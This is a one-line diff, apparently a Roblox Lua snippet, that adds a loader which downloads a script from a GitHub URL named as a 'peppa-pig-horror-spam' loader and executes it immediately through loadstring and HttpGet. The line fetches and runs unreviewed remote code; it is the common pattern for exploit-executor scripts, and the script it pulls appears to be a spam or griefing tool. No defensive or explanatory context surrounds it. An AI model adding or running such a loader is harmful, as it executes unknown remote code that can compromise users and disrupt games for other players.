@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/peppa-pig-horror-spam3-j8clo1geol4yqm.lua"))()
